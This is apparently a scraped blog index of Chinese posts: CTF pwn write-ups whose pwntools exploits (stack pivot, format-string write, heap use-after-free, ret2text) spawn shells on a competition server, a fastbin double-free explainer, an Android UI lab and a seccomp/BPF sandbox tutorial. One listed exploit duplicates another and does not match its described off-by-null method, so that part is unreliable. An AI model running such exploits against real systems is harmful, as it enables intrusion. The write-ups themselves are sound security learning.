0x080484d8offset = 0xffffd028 - 0xffffcff0 #ebp距离输入地址的值pay = b'a'*0x27 + b'b'p.send(pay)p.recvuntil('b')ebp_addr = u32(p.recv(4))print(\"ebp_addr -&gt; \",hex(ebp_addr)) #泄露ebps_addr = ebp_addr - 0x38 #计算ebp 和 输入 的距离pay1 = p32(0)pay1 += p32(system_addr)pay1 += p32(binsh)pay1 += p32(0)pay1 = pay1.ljust(0x28,b'\\x00')pay1 += p32(s_addr)pay1 += p32(leave_ret)gdb.attach(p)p.send(pay1)p.interactive()\n夕阳下的舞者\n程序保护\nArch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      PIE enabled\n解题思路\n题目主要类型为offbynull制造堆块重叠，函数结构比较复杂，需要ida逆向理清，这里提供简单思路\n\nStep1：泄露libc基址。申请chunk，正常释放，大于fastbin的chunk会被放入unsortedbin中，且fd和bk均指向于main_arena_88的位置，可以获得libc基址\nStep2：泄露堆地址。为啥泄露堆地址，因为开启了PIE，创建2个不相邻的 small chunk，释放后会放到 unsoted bin 中，通过打印函数可以泄露地址。\nStep3：off-by-null，getshell 利用off-by-null漏洞制造堆块重叠，用fastbin去申请mallochook-0x23位置的一个chunk去修改mallochook为og\n\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *#p = remote('123.60.135.228',2131)p = process('./stack_pivotingx86')context(log_level = 'debug', os = 'linux', arch = 'i386')binsh = 0x0804A030system_addr = 0x08048579leave_ret = 0x080484d8offset = 0xffffd028 - 0xffffcff0 #ebp距离输入地址的值pay = b'a'*0x27 + b'b'p.send(pay)p.recvuntil('b')ebp_addr = u32(p.recv(4))print(\"ebp_addr -&gt; \",hex(ebp_addr)) #泄露ebps_addr = ebp_addr - 0x38 #计算ebp 和 输入 的距离pay1 = p32(0)pay1 += p32(system_addr)pay1 += p32(binsh)pay1 += p32(0)pay1 = pay1.ljust(0x28,b'\\x00')pay1 += p32(s_addr)pay1 += p32(leave_ret)gdb.attach(p)p.send(pay1)p.interactive()\ntest_format\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n解题思路\n格式化字符串漏洞，修改任意位置的值\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2121)#p = process('./test_format')context(log_level = 'debug', os = 'linux', arch = 'amd64')elf = ELF('./test_format')goal = 0x0804A030payload = 'aaaa%8$n' + p64(goal)p.sendline(payload)p.interactive()\nheap_Easy_Uaf\n程序保护\nArch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n解题思路\n漏洞存在于Are()函数中，函数malloc了一个0x71大小的堆块，但是并没有清0，存在释放后使用的可能性。在之后申请了一个chunk b，chunk b的内容存在堆溢出。我这里的思路就是如果在a的上方有个大小小于0x71，释放的chunk，程序会将b申请到a的上方，这样通过堆溢出可以修改a的内容为\"Flag\"，官方做法是直接 将申请的b在a中，填写b的内容为Flag也可以！\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *from LibcSearcher import *p = remote('123.60.135.228',2094)#p = process('./heap_Easy_Uaf')context(log_level = 'debug', os = 'linux', arch = 'amd64')elf = ELF('./heap_Easy_Uaf')#heaparray = 0x602100def cmd(xuhao):    p.recvuntil('Please Choice!\\n')    p.sendline(xuhao)def add(size,content):    cmd(\"1\")    p.recvuntil('Please Input Size:\\n')    p.sendline(str(size))    p.recvuntil('Content of Emo!:')    p.sendline(content)def delete(index):    cmd(\"2\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def edit(index,content):    cmd(\"3\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))    p.recvuntil('Change EMo Content\\n')    p.send(content)def show(index):    cmd(\"4\")    p.recvuntil('Please Input index:\\n')    p.sendline(str(index))def amaze(size,content):    cmd(\"5\")    p.recvuntil('Please Input Chunk size :\\n')    p.sendline(str(size))    p.recvuntil('Please Input Content : \\n')    p.sendline(content)def exit():    cmd(\"6\")def debug():    gdb.attach(p)    pause()heap_ptr = 0x602100shell=0x400A16add(8,'aaaa') #0add(8,'aaaa') #1#debug()amaze(8,'')#debug()delete(1)#debug()pay = 'a'*0x18 + p64(0x71) + \"Flag\"amaze(8,pay)p.interactive()\n小狗汪汪汪\n程序保护\nArch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)\n解题思路\nret2text\nexp\n#!/usr/bin/python# -*- coding: utf-8 -*-from pwn import *p = remote('123.60.135.228',2133)#p = process('./woof')context(log_level = 'debug', os = 'linux', arch = 'i386')backdoor = 0x0804859Bp.recvuntil(b'This puppy needs to eat a few bones?\\n')payload = b'a'*(0x9+4) + p32(0x0804859B)p.sendline(payload)p.interactive()\n","categories":["wp"],"tags":["wp"]},{"title":"doublefree","url":"/2023/04/10/double%20free/","content":"利用条件\n\n1.fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空\n2.fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。\n\n该漏洞是指将同一个chunk free两次，通常情况下free两个chunk会报错是无法编译的，监测机制也很简单，就仅仅是对free变量与前一个进行对比，所以可以中间夹一个其他的实现：\nfree(shangu1)free(shangu2)free(shangu1)\n此时的 bins 中情况大概如下：0x20 —&gt; shangu1 —&gt; shangu2 —&gt; shangu1\n当再次申请堆时会出现 有两个指针指向同一个chunk\n![联想截图_20230322221849.png](https://s2.loli.net/2023/09/12/BI6lRtbdPnKTuMN.png\n","categories":["heap"],"tags":["fastbin attack"]},{"title":"移动开发实验1：类微信界面","url":"/2023/10/07/%E7%A7%BB%E5%8A%A8%E5%BC%80%E5%8F%91%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E7%B1%BB%E5%BE%AE%E4%BF%A1%E7%95%8C%E9%9D%A2/","content":"AS类微信界面开发\n功能要求\n开发一个类微信的主界面框架，UI布局为上中下布局，包含4个fragment界面，当点击选择底部部件的时候进行页面切换\n开发技术\n开发工具：as\n版本：API 24 Android 7.0\n思路分析\n类微信界面主要分为上中下三个部分，其中上下为 top.xml和 bottom.xml 为基础信息显示。\n主界面中间部分由4个页面叠加，在进行选择内容时变换界面\n设计过程\n1. 导入所需图片到drawable目录下\n\n2. 布局设计\n标题栏top\n图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    android:layout_width=\"match_parent\"    android:layout_height=\"50dp\"    android:background=\"@color/black\"    android:gravity=\"center\"    android:orientation=\"vertical\"&gt;    &lt;TextView        android:id=\"@+id/textView\"        android:layout_width=\"match_parent\"        android:layout_height=\"wrap_content\"        android:layout_weight=\"1\"        android:background=\"@color/black\"        android:gravity=\"center_horizontal\"        android:text=\"微信\"        android:textColor=\"@color/white\"        android:textSize=\"40sp\"&gt;&lt;/TextView&gt;&lt;/LinearLayout&gt;\n底部选择栏bottom\n图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"wrap_content\"    android:baselineAligned=\"false\"    android:orientation=\"horizontal\"&gt;    &lt;!-- 微信--&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_wx\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"center\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_wx_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/wx\"/&gt;        &lt;TextView            android:id=\"@+id/id_tab_wx_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:background=\"@color/black\"            android:gravity=\"center\"            android:text=\"聊天\"            android:textColor=\"@color/white\"            android:textSize=\"30sp\" /&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_friend\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"bottom\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_friend_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/txl\" /&gt;        &lt;TextView            android:id=\"@+id/id_tab_friend_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:gravity=\"center\"            android:textColor=\"@color/white\"            android:background=\"@color/black\"            android:textSize=\"30sp\"            android:text=\"通讯\" /&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_address\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"bottom\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_address_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/find\" /&gt;        &lt;TextView            android:id=\"@+id/id_tab_address_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:gravity=\"center\"            android:textColor=\"@color/white\"            android:background=\"@color/black\"            android:textSize=\"30sp\"            android:text=\"发现\" /&gt;    &lt;/LinearLayout&gt;    &lt;LinearLayout        android:id=\"@+id/id_tab_setting\"        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:layout_weight=\"1\"        android:gravity=\"bottom\"        android:orientation=\"vertical\"&gt;        &lt;ImageView            android:id=\"@+id/id_tab_setting_img\"            android:layout_width=\"match_parent\"            android:layout_height=\"50dp\"            android:background=\"@color/black\"            android:src=\"@drawable/w\" /&gt;        &lt;TextView            android:id=\"@+id/id_tab_setting_txt\"            android:layout_width=\"126dp\"            android:layout_height=\"wrap_content\"            android:gravity=\"center\"            android:textColor=\"@color/white\"            android:background=\"@color/black\"            android:textSize=\"30sp\"            android:text=\"我的\" /&gt;    &lt;/LinearLayout&gt;&lt;/LinearLayout&gt;\n中间部分\n通过一个xml文件将标题栏部分和底部选择栏部分添加到一个xml文件里面，再两个文件中间添加一个content部件，将四个fragment当做卡片压入中间主体部分。四个fragment的xml文件类似，故只放一个文件的内容。\n图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;FrameLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    tools:context=\".ltFragment\"&gt;    &lt;!-- TODO: Update blank fragment layout --&gt;    &lt;TextView        android:layout_width=\"match_parent\"        android:layout_height=\"match_parent\"        android:gravity=\"center\"        android:textSize=\"35sp\"        android:text=\"这是聊天界面\" /&gt;&lt;/FrameLayout&gt;\nmain.xml\n图片\n\n代码\n&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\"    xmlns:tools=\"http://schemas.android.com/tools\"    xmlns:app=\"http://schemas.android.com/apk/res-auto\"    android:layout_width=\"match_parent\"    android:layout_height=\"match_parent\"    android:orientation=\"vertical\"    tools:context=\".MainActivity\"&gt;    &lt;include layout=\"@layout/top\" &gt;&lt;/include&gt;    &lt;FrameLayout        android:id=\"@+id/content\"        android:layout_width=\"wrap_content\"        android:layout_height=\"0dp\"        android:layout_gravity=\"center\"        android:layout_weight=\"1\"&gt;    &lt;/FrameLayout&gt;    &lt;include layout=\"@layout/bottom\"&gt;&lt;/include&gt;&lt;/LinearLayout&gt;\n3. Java文件代码编写\n首先依次创建4个fragement\n\n会在相应的layout文件夹下生成4个.xml文件\n\n目前的界面只是一个比较简单的界面，需要完成的功能仅有展示和通过点击部件更换中间部分展示的界面，所以要考虑的代码部分分别为以下四个内容：\n\n\n点击监听部分onclick\n\n\n\n\n将4个fragment压入content里面的代码部分\n\n\n\n\n将四个卡片隐藏起来的代码部分\n\n\n\n\n当点击时展示的界面代码部分\n\n\n创建4个Frangment变量、1个管理对象FragmentManager变量 、4个LinearLayout变量对象\nFragment fragment1,fragment2,fragment3,fragment4;    FragmentManager fm;    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;\n新建一个inital函数用以给Fragment页面初始化，在此函数中，将此前定义个4个Fragment变量使用fragmentManager添加到main文件中的中间主体部分的布局中\npublic void inital() {    FragmentTransaction ft = fm.beginTransaction()            .add(R.id.content,fragment1)            .add(R.id.content,fragment2)            .add(R.id.content,fragment3)            .add(R.id.content,fragment4);    ft.commit();}\n在点击四个部件时需要展示其所代表的界面，故编写新的一个函数showfragment，展示fragment界面\nprivate void fragmentshow(Fragment fragment) {       FragmentTransaction transaction = fm.beginTransaction()               .show(fragment);       transaction.commit();   }\n而在切换界面时，需要对原先的界面进行隐藏之后再展示所需界面，故编写一个新的函数fragmentHide，将所有的fragment界面都隐藏\nprivate void fragmenthide() {        FragmentTransaction ft = fm.beginTransaction()                .hide(fragment1)                .hide(fragment2)                .hide(fragment3)                .hide(fragment4);        ft.commit();    }\n仅对底部选择栏的四个控件进行监听，并根据监听所得到的结果调用fragment界面\nlinearLayout1.setOnClickListener(this);   linearLayout2.setOnClickListener(this);   linearLayout3.setOnClickListener(this);   linearLayout4.setOnClickListener(this);\n注意这里设置了全局监听\n因此要修改和覆写onClick函数\n修改此处\n\n覆写onClick函数\n@Override    public void onClick(View view) {        fragmenthide();        if (view.getId()==R.id.id_tab_wx){            fragmentshow(fragment1);        }else if (view.getId()==R.id.id_tab_friend){            fragmentshow(fragment2);        }else if (view.getId()==R.id.id_tab_address){            fragmentshow(fragment3);        }else if(view.getId()==R.id.id_tab_setting){            fragmentshow(fragment4);        }    }\n而在最开始的界面自然就是聊天界面，故在最开始的时候就调用聊天的fragment\nfragmentshow(fragment1);\nMainActivity.java全部内容展示\npackage com.example.mywork;import androidx.appcompat.app.AppCompatActivity;import androidx.fragment.app.Fragment;import androidx.fragment.app.FragmentManager;import androidx.fragment.app.FragmentTransaction;import android.os.Bundle;import android.view.View;import android.widget.LinearLayout;public class MainActivity extends AppCompatActivity implements View.OnClickListener{    Fragment fragment1,fragment2,fragment3,fragment4;    FragmentManager fm;    LinearLayout linearLayout1,linearLayout2,linearLayout3,linearLayout4;    @Override    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView(R.layout.main);        fragment1 = new ltFragment();        fragment2 = new txlFragment();        fragment3 = new findFragment();        fragment4 = new wdFragment();        fm = getSupportFragmentManager();        linearLayout1 = findViewById(R.id.id_tab_wx);        linearLayout2 = findViewById(R.id.id_tab_friend);        linearLayout3 = findViewById(R.id.id_tab_address);        linearLayout4 = findViewById(R.id.id_tab_setting);        inital();        fragmenthide();        fragmentshow(fragment1);        linearLayout1.setOnClickListener(this);        linearLayout2.setOnClickListener(this);        linearLayout3.setOnClickListener(this);        linearLayout4.setOnClickListener(this);    }    private void fragmenthide() {        FragmentTransaction ft = fm.beginTransaction()                .hide(fragment1)                .hide(fragment2)                .hide(fragment3)                .hide(fragment4);        ft.commit();    }    public void inital() {        FragmentTransaction ft = fm.beginTransaction()                .add(R.id.content,fragment1)                .add(R.id.content,fragment2)                .add(R.id.content,fragment3)                .add(R.id.content,fragment4);        ft.commit();    }    @Override    public void onClick(View view) {        fragmenthide();        if (view.getId()==R.id.id_tab_wx){            fragmentshow(fragment1);        }else if (view.getId()==R.id.id_tab_friend){            fragmentshow(fragment2);        }else if (view.getId()==R.id.id_tab_address){            fragmentshow(fragment3);        }else if(view.getId()==R.id.id_tab_setting){            fragmentshow(fragment4);        }    }    private void fragmentshow(Fragment fragment) {        FragmentTransaction transaction = fm.beginTransaction()                .show(fragment);        transaction.commit();    }}\n结果展示\n\n\n\n\n代码仓库\nKylinxin/MyWork: 类微信界面源代码 (github.com)\n总结\n这是我第一次利用as进行移动开发实现了一个简单的类微信的界面设计，加强了我对as的fragment、基本layout的认知，以及对xml文件进行界面编写部分以及对相关的控件有了更深入的了解，能够设计基础UI界面，实现界面跳转功能，给我提供了一定的思路进行功能和界面相互连接的代码的编写。在这次的实验下我也对AS这款软件进行了熟悉，对于其提词器的强大有了很深的印象。\n​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——2023.10.7\n","categories":["实验"],"tags":["移动开发实验"]},{"title":"prctl-seccomp-orw","url":"/2023/09/18/prctl-seccomp/","content":"初探（Linux Kernel）sandbox中的prctl-seccomp机制（orw）\n\n题目来源：https://pwnable.tw/challenge/#2（orw）\n参考资料：\nhttps://www.anquanke.com/post/id/186447\nhttps://man7.org/linux/man-pages/man2/prctl.2.html\nhttps://blog.betamao.me/2019/01/23/Linux%E6%B2%99%E7%AE%B1%E4%B9%8Bseccomp/\n附件：\n链接: https://pan.baidu.com/s/1ppU1-qZEBHQtNcrTwzXx-A  密码: hvqc\n–来自百度网盘超级会员V3的分享\n\nprctl-seccomp 简介\nseccomp 是 secure computing 的缩写，其是从 Linux kernel 2.6.23版本引入的一种简洁的 sandbox 机制，可以当作沙箱使用。在编写C语言程序过程中，可以通过引入prctl函数来实现内核级的安全机制；程序编译运行后，相当于进程进入到一种“安全”运行模式。为什么要引入这样一种安全机制？正常情况下在 Linux 系统里，大量的系统调用（system call）会直接暴露给用户态程序，也就是说程序可以使用所有的syscall，此时如果劫持程序流程通过exeve或system来调用syscall就会获得用户态的shell权限。可以看到并不是所有的系统调用都被需要，不安全的代码滥用系统调用会对系统造成安全威胁。为了防范这种攻击方式，这时seccomp就派上了用场，在严格模式下的进程只能调用4种系统调用，即 read()、write()、 exit() 和 sigreturn()，其他的系统调用都会杀死进程，过滤模式下可以指定允许那些系统调用，规则是bpf，可以使用seccomp-tools查看。\n\nsandbox：沙箱、沙盒\n\n使用seccomp-tools查看可用系统调用（识别沙箱规则）\n\n安装方式：https://github.com/david942j/seccomp-tools\n$ gem install seccomp-tools\nsudo apt install gcc ruby-dev\n\n执行如下图中命令即可查看此ELF文件中可用的系统调用：\nctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW    \n##从IDA开始分析题目\n将题目下载下来，我们先来看一下程序的代码，直接来到main函数：\nint __cdecl main(int argc, const char **argv, const char **envp){  orw_seccomp();  printf(\"Give my your shellcode:\");  read(0, &amp;shellcode, 0xC8u);  ((void (*)(void))shellcode)();  return 0;}\n进入orw_seccomp();\nunsigned int orw_seccomp(){  __int16 v1; // [esp+4h] [ebp-84h] BYREF  char *v2; // [esp+8h] [ebp-80h]  char v3[96]; // [esp+Ch] [ebp-7Ch] BYREF  unsigned int v4; // [esp+6Ch] [ebp-1Ch]  v4 = __readgsdword(0x14u);  qmemcpy(v3, &amp;unk_8048640, sizeof(v3));  v1 = 12;  v2 = v3;  prctl(38, 1, 0, 0, 0);  prctl(22, 2, &amp;v1);  return __readgsdword(0x14u) ^ v4;}\n我们注意一下代码中的两个prctl：\n\nprctl(38, 1, 0, 0, 0)\nprctl(22, 2, &amp;v1);\n\n先记住这两个函数，接下来会提到，这里暂时先放一放。\nprctl函数原型\n看一下这个函数的原型：\n#include &lt;sys/prctl.h&gt; int prctl(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5); \n函数中有5个参数，重点来看一下参数中的“int option”，因为option的中文本意是选择，了解了这个参数我们也就知道整个函数要干嘛，这里我们需要重点关注两个选项：\nPR_SET_NO_NEW_PRIVSPR_SET_SECCOMP\n先来看第一个，PR_SET_NO_NEW_PRIVS：\nSet the calling thread's no_new_privs attribute to thevalue in arg2.  With no_new_privs set to 1, execve(2)promises not to grant privileges to do anything that couldnot have been done without the execve(2) call (forexample, rendering the set-user-ID and set-group-ID modebits, and file capabilities non-functional).  Once set,the no_new_privs attribute cannot be unset.  The settingof this attribute is inherited by children created byfork(2) and clone(2), and preserved across execve(2).\n简单的说，如果 option 设置为 PR_SET_NO_NEW_PRIVS并且第二个参数（unsigned long arg2）设置为 1，那么这个可执行文件不能够进行execve的系统调用（system 函数、one_gadget失效，但是其他的系统调用仍可以正常运行），同时这个选项还会继承给子进程。放到prctl函数中就是：\nprctl(PR_SET_NO_NEW_PRIVS,1,0,0,0);     //设为1\n\nhttps://blog.betamao.me/2019/01/23/Linux沙箱之seccomp/\n在早期使用seccomp是使用prctl系统调用实现的，后来封装成了一个libseccomp库，可以直接使用seccomp_init,seccomp_rule_add,seccomp_load来设置过滤规则，但是我们学习的还是从prctl，这个系统调用是进行进程控制的，这里关注seccomp功能。\n首先，要使用它需要有CAP_SYS_ADMIN权能，否则就要设置PR_SET_NO_NEW_PRIVS位，若不这样做非root用户使用这个程序时seccomp保护将会失效！设置了PR_SET_NO_NEW_PRIVS位后能保证seccomp对所有用户都能起作用，并且会使子进程即execve后的进程依然受控，意思就是即使执行execve这个系统调用替换了整个binary权限不会变化，而且正如其名它设置以后就不能再改了，即使可以调用ptctl也不能再把它禁用掉。\n\n在 include/linux/prctl.h 中找到 PR_SET_NO_NEW_PRIVS 常量对应的数值，正好是 38，因此也就对应上了上述题目中的第一个 prctl 语句。\n\n接着看第二个options PR_SET_SECCOMP：\n\nSet the secure computing (seccomp) mode for the calling thread,\nto limit the available system calls.\n\n一句话，这个参数是用来设置 seccomp ，其实也就是设置沙箱是否开启。\n常常与它在prctl出现的还有如下两个参数：\nSECCOMP_MODE_STRICT：    the only system calls that the thread is permitted to make are read(2),\twrite(2),_exit(2) (but not exit_group(2)), and sigreturn(2). SECCOMP_MODE_FILTER (since Linux 3.5)：    the system calls allowed are defined by a pointer to a Berkeley Packet     Filter passed in arg3.  This argument is a pointer to struct sock_fprog; \tit can be designed to filter arbitrary system calls and system call arguments.  1、SECCOMP_MODE*STRICT(1)：\t允许线程进行的唯一系统调用是read（2），write（2），*exit（2）（但不是exit_group（2））    和sigreturn（2）。2、SECCOMP_MODE_FILTER(2) (since Linux 3.5)：    允许的系统调用由指向arg3中传递的Berkeley Packet Filter的指针定义。     这个参数是一个指向struct sock_fprog的指针; 它可以设计为过滤任意系统调用和系统调用参数\n上述英文大概说的是如果设置了 SECCOMP_MODE_STRICT 模式的话，系统调用只能使用 read, write,_exit 这三个。如果设置了 SECCOMP_MODE_FILTER 的话，系统调用规则就可以被 Berkeley Packet Filter（BPF） 的规则所定义，这玩意就是这里最最重点的东西了，这个东西文章后面说。\n将这几个参数带入到prctl：\nprctl(PR_SET_SECCOMP,SECCOMP_MODE_FILTER,&amp;prog);//第一个参数要进行什么设置，第二个是设置为过滤模式，第三个参数就是过滤规则//PR_SET_SECCOMP：控制程序去是否开启seccomp mode，\n其中SECCOMP_MODE_FILTER 可以用常量表示为 2，回到之前的题，在第二个 prctl 函数中执行的就是：\nprctl(22, 2, &amp;v1);//IDA中反编译的不准确，其实&amp;v0代表的就是过滤规则//22应该对应的是表示seccomp mode是开启状态（这个不太确定，因为我没有翻源码）\n上面v1所储存的内容表示设置沙箱规则，从而可以实现改变函数的系统调用（通行或者禁止）：我们在IDA中具体看一下v1所定义的规则：\n.rodata:08048640 20                            unk_8048640 db  20h                     ; DATA XREF: orw_seccomp+17↑o.rodata:08048641 00                            db    0.rodata:08048642 00                            db    0.rodata:08048643 00                            db    0.rodata:08048644 04                            db    4.rodata:08048645 00                            db    0.rodata:08048646 00                            db    0.rodata:08048647 00                            db    0.rodata:08048648 15                            db  15h.rodata:08048649 00                            db    0.rodata:0804864A 00                            db    0.rodata:0804864B 09                            db    9.rodata:0804864C 03                            db    3.rodata:0804864D 00                            db    0.rodata:0804864E 00                            db    0.rodata:0804864F 40                            db  40h ; @.rodata:08048650 20                            db  20h.rodata:08048651 00                            db    0.rodata:08048652 00                            db    0.rodata:08048653 00                            db    0.rodata:08048654 00                            db    0.rodata:08048655 00                            db    0.rodata:08048656 00                            db    0.rodata:08048657 00                            db    0.rodata:08048658 15                            db  15h.rodata:08048659 00                            db    0.rodata:0804865A 07                            db    7.rodata:0804865B 00                            db    0.rodata:0804865C AD                            db 0ADh\n好家伙，我直接看不懂。但是其实这些内容已经在前面出现过：\nctfshow@ubuntu:/mnt/hgfs/PWN题/Range/pwnable.xyz$ seccomp-tools dump ./orww line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38) 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW    \n\n从图中可以看出现在只有open、write、read、sigreturn这四个系统调用可以使用。\n对照一下，是不是一模一样？但是这些内容又意味这什么？上面的line、CODE、JT、JF、K又是什么意思？\n\nBPF 规则介绍\nQ：BPF是数据链路层上的一种接口，它怎么会出现在系统调用中？\nA：其实这原本是TCP协议包的过滤规则格式，后面被引用为沙箱规则。\n\n简单的说BPF定义了一个伪机器。这个伪机器可以执行代码，有一个累加器，寄存器（RegA），和赋值、算术、跳转指令。一条指令由一个定义好的结构struct bpf_insn表示，与真正的机器代码很相似，若干个这样的结构组成的数组，就成为 BPF 的指令序列。\n&amp;prog是指向如下结构体的指针，这个结构体记录了过滤规则个数与规则数组起始位置:\nstruct sock_fprog {   unsigned short      len;    /* Number of BPF instructions */   struct sock_filter *filter; /* Pointer to array of BPF instructions */};\n而filter域就指向了具体的规则，每一条规则有如下形式：\nstruct sock_filter {            /* Filter block */    __u16 code;                 /* Actual filter code */    __u8  jt;                   /* Jump true */    __u8  jf;                   /* Jump false */    __u32 k;                    /* Generic multiuse field */};\n为了操作方便定义了一组宏来完成filter的填写(定义在/usr/include/linux/bpf_common.h)：\n#ifndef BPF_STMT#define BPF_STMT(code, k) { (unsigned short)(code), 0, 0, k }#endif#ifndef BPF_JUMP#define BPF_JUMP(code, k, jt, jf) { (unsigned short)(code), jt, jf, k }#endif\n样会简单一点，再来看看code，它是由多个”单词”组成的”短语”，类似”动宾结构”，”单词”间使用”+”连接：\n#define BPF_CLASS(code) ((code) &amp; 0x07)         //首先指定操作的类别#define\t\tBPF_LD\t\t0x00                    //将值cp进寄存器#define\t\tBPF_LDX\t\t0x01#define\t\tBPF_ST\t\t0x02#define\t\tBPF_STX\t\t0x03#define\t\tBPF_ALU\t\t0x04#define\t\tBPF_JMP\t\t0x05#define\t\tBPF_RET\t\t0x06#define\t\tBPF_MISC    0x07\t/* ld/ldx fields */#define BPF_SIZE(code)  ((code) &amp; 0x18)         //在ld时指定操作数的大小#define\t\tBPF_W\t\t0x00#define\t\tBPF_H\t\t0x08#define\t\tBPF_B\t\t0x10#define BPF_MODE(code)  ((code) &amp; 0xe0)         //操作数类型#define\t\tBPF_IMM\t\t0x00#define\t\tBPF_ABS\t\t0x20#define\t\tBPF_IND\t\t0x40#define\t\tBPF_MEM\t\t0x60#define\t\tBPF_LEN\t\t0x80#define\t\tBPF_MSH\t\t0xa0/* alu/jmp fields */#define BPF_OP(code)    ((code) &amp; 0xf0)         //当操作码类型为ALU时，指定具体运算符#define\t\tBPF_ADD\t\t0x00                    //到底执行什么操作可以看filter.h里面的定义#define\t\tBPF_SUB\t\t0x10#define\t\tBPF_MUL\t\t0x20#define\t\tBPF_DIV\t\t0x30#define\t\tBPF_OR\t\t0x40#define\t\tBPF_AND\t\t0x50#define\t\tBPF_LSH\t\t0x60#define\t\tBPF_RSH\t\t0x70#define\t\tBPF_NEG\t\t0x80#define\t\tBPF_MOD\t\t0x90#define\t\tBPF_XOR\t\t0xa0#define\t\tBPF_JA\t\t0x00                    //当操作码类型是JMP时指定跳转类型#define\t\tBPF_JEQ\t\t0x10#define\t\tBPF_JGT\t\t0x20#define\t\tBPF_JGE\t\t0x30#define\t\tBPF_JSET        0x40#define BPF_SRC(code)   ((code) &amp; 0x08)         #define\t\tBPF_K\t\t0x00                    